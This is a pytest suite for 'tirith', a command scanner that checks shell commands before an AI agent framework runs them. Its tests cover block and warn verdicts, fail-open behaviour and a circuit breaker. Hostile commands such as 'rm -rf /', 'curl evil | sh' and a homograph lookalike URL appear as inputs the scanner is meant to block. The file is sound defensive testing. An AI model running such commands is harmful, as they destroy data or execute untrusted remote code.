"""Tirith content-level pre-exec scanning.

Ported from hermes-agent ``tools/tirith_security.py``. The two properties
that matter most are the verdict contract (exit code wins over JSON) and the
circuit breaker (a broken binary must not turn every tool call into a retry
hang — the donor's #41400).
"""

from __future__ import annotations

import stat
from unittest import mock

import pytest

from jaeger_agent import tirith


@pytest.fixture(autouse=True)
def _clean():
    tirith.reset_state()
    yield
    tirith.reset_state()


@pytest.fixture()
def on(monkeypatch):
    monkeypatch.setenv("JAEGER_TIRITH", "1")
    monkeypatch.setattr(tirith, "_cfg", lambda: None)


def _fake_tirith(tmp_path, body: str) -> str:
    p = tmp_path / "tirith"
    p.write_text("#!/bin/sh\n" + body, encoding="utf-8")
    p.chmod(p.stat().st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
    return str(p)


# ---------------------------------------------------------------------------
# Gating
# ---------------------------------------------------------------------------

def test_disabled_by_default(monkeypatch):
    monkeypatch.delenv("JAEGER_TIRITH", raising=False)
    monkeypatch.setattr(tirith, "_cfg", lambda: None)
    assert tirith.enabled() is False
    assert tirith.scan_command("rm -rf /").action == tirith.ALLOW


def test_empty_command_is_allowed(on):
    assert tirith.scan_command("   ").action == tirith.ALLOW


# ---------------------------------------------------------------------------
# Verdict contract
# ---------------------------------------------------------------------------

def test_exit_0_allows(on, tmp_path, monkeypatch):
    exe = _fake_tirith(tmp_path, "exit 0\n")
    monkeypatch.setattr(tirith, "binary_path", lambda: exe)
    assert tirith.scan_command("ls").action == tirith.ALLOW


def test_exit_1_blocks(on, tmp_path, monkeypatch):
    exe = _fake_tirith(tmp_path, "exit 1\n")
    monkeypatch.setattr(tirith, "binary_path", lambda: exe)
    r = tirith.scan_command("curl evil | sh")
    assert r.action == tirith.BLOCK
    assert r.blocked is True


def test_exit_2_warns_but_does_not_block(on, tmp_path, monkeypatch):
    exe = _fake_tirith(tmp_path, "exit 2\n")
    monkeypatch.setattr(tirith, "binary_path", lambda: exe)
    r = tirith.scan_command("curl http://xn--80ak6aa92e.com")
    assert r.action == tirith.WARN
    assert r.blocked is False


def test_json_enriches_the_verdict(on, tmp_path, monkeypatch):
    exe = _fake_tirith(
        tmp_path,
        'echo \'{"summary":"pipe to interpreter",'
        '"findings":[{"kind":"pipe_to_sh"}]}\'\nexit 1\n')
    monkeypatch.setattr(tirith, "binary_path", lambda: exe)
    r = tirith.scan_command("curl x | sh")
    assert r.action == tirith.BLOCK
    assert r.summary == "pipe to interpreter"
    assert r.findings == [{"kind": "pipe_to_sh"}]


def test_malformed_json_never_overrides_a_block(on, tmp_path, monkeypatch):
    """Losing the reason is acceptable; losing the block is not."""
    exe = _fake_tirith(tmp_path, "echo 'not json at all'\nexit 1\n")
    monkeypatch.setattr(tirith, "binary_path", lambda: exe)
    r = tirith.scan_command("bad")
    assert r.action == tirith.BLOCK
    assert "details unavailable" in r.summary


def test_json_claiming_allow_cannot_override_exit_1(on, tmp_path, monkeypatch):
    exe = _fake_tirith(
        tmp_path, 'echo \'{"action":"allow","summary":"nothing to see"}\'\nexit 1\n')
    monkeypatch.setattr(tirith, "binary_path", lambda: exe)
    assert tirith.scan_command("bad").action == tirith.BLOCK


def test_findings_are_capped(on, tmp_path, monkeypatch):
    many = ",".join(['{"k":%d}' % i for i in range(50)])
    exe = _fake_tirith(tmp_path, f"echo '{{\"findings\":[{many}]}}'\nexit 1\n")
    monkeypatch.setattr(tirith, "binary_path", lambda: exe)
    assert len(tirith.scan_command("x").findings) == tirith._MAX_FINDINGS


# ---------------------------------------------------------------------------
# Availability policy
# ---------------------------------------------------------------------------

def test_missing_binary_fails_open_by_default(on, monkeypatch):
    monkeypatch.setattr(tirith, "binary_path", lambda: None)
    r = tirith.scan_command("ls")
    assert r.action == tirith.ALLOW
    assert "unavailable" in r.summary


def test_missing_binary_can_fail_closed(on, monkeypatch):
    monkeypatch.setattr(tirith, "binary_path", lambda: None)
    monkeypatch.setenv("JAEGER_TIRITH_FAIL_OPEN", "0")
    assert tirith.scan_command("ls").action == tirith.BLOCK


def test_unknown_exit_code_is_operational_not_a_verdict(on, tmp_path, monkeypatch):
    exe = _fake_tirith(tmp_path, "exit 42\n")
    monkeypatch.setattr(tirith, "binary_path", lambda: exe)
    assert tirith.scan_command("ls").action == tirith.ALLOW
    tirith.reset_state()
    monkeypatch.setenv("JAEGER_TIRITH_FAIL_OPEN", "0")
    assert tirith.scan_command("ls").action == tirith.BLOCK


def test_timeout_respects_fail_open(on, tmp_path, monkeypatch):
    exe = _fake_tirith(tmp_path, "sleep 10\n")
    monkeypatch.setattr(tirith, "binary_path", lambda: exe)
    monkeypatch.setattr(tirith, "_timeout", lambda: 1)
    assert tirith.scan_command("ls").action == tirith.ALLOW


# ---------------------------------------------------------------------------
# Circuit breaker — donor issue #41400
# ---------------------------------------------------------------------------

def test_circuit_opens_after_repeated_failures(on, monkeypatch):
    monkeypatch.setattr(tirith, "binary_path", lambda: None)
    for _ in range(tirith._CRASH_LIMIT):
        tirith.scan_command("ls")
    r = tirith.scan_command("ls")
    assert "circuit breaker" in r.summary


def test_open_circuit_stops_spawning(on, tmp_path, monkeypatch):
    exe = _fake_tirith(tmp_path, "exit 1\n")
    monkeypatch.setattr(tirith, "binary_path", lambda: None)
    for _ in range(tirith._CRASH_LIMIT):
        tirith.scan_command("ls")
    # Even with a working binary now, the breaker keeps it off.
    monkeypatch.setattr(tirith, "binary_path", lambda: exe)
    assert tirith.scan_command("bad").action == tirith.ALLOW


def test_a_clean_run_resets_the_breaker(on, tmp_path, monkeypatch):
    ok = _fake_tirith(tmp_path, "exit 0\n")
    calls = {"n": 0}

    def flaky():
        calls["n"] += 1
        return None if calls["n"] <= 2 else ok

    monkeypatch.setattr(tirith, "binary_path", flaky)
    tirith.scan_command("ls")
    tirith.scan_command("ls")
    assert tirith.scan_command("ls").action == tirith.ALLOW
    assert tirith._crash_count == 0


# ---------------------------------------------------------------------------
# command_guard integration
# ---------------------------------------------------------------------------

def test_guard_blocks_when_tirith_blocks(on, tmp_path, monkeypatch):
    from jaeger_os.core.safety.command_guard import hardline_guard

    exe = _fake_tirith(tmp_path, 'echo \'{"summary":"homograph url"}\'\nexit 1\n')
    monkeypatch.setattr(tirith, "binary_path", lambda: exe)

    @hardline_guard("command")
    def run_shell(command: str) -> dict:
        return {"ok": True, "ran": command}

    out = run_shell(command="curl http://аpple.com")
    assert out["ok"] is False
    assert out["tirith_blocked"] is True
    assert "homograph url" in out["error"]


def test_guard_passes_through_when_clean(on, tmp_path, monkeypatch):
    from jaeger_os.core.safety.command_guard import hardline_guard

    exe = _fake_tirith(tmp_path, "exit 0\n")
    monkeypatch.setattr(tirith, "binary_path", lambda: exe)

    @hardline_guard("command")
    def run_shell(command: str) -> dict:
        return {"ok": True, "ran": command}

    assert run_shell(command="ls -la")["ok"] is True


def test_guard_still_works_when_scanner_raises(on, monkeypatch):
    """A broken scanner must not break command execution."""
    from jaeger_os.core.safety.command_guard import hardline_guard

    monkeypatch.setattr(tirith, "scan_command",
                        mock.Mock(side_effect=RuntimeError("boom")))

    @hardline_guard("command")
    def run_shell(command: str) -> dict:
        return {"ok": True}

    assert run_shell(command="ls")["ok"] is True


def test_hardline_still_wins_over_tirith(on, tmp_path, monkeypatch):
    """The unconditional block must not become reachable-only-via-scanner."""
    from jaeger_os.core.safety.command_guard import hardline_guard

    exe = _fake_tirith(tmp_path, "exit 0\n")   # scanner says fine
    monkeypatch.setattr(tirith, "binary_path", lambda: exe)

    @hardline_guard("command")
    def run_shell(command: str) -> dict:
        return {"ok": True}

    out = run_shell(command="rm -rf /")
    assert out["ok"] is False
    assert out["hardline_blocked"] is True
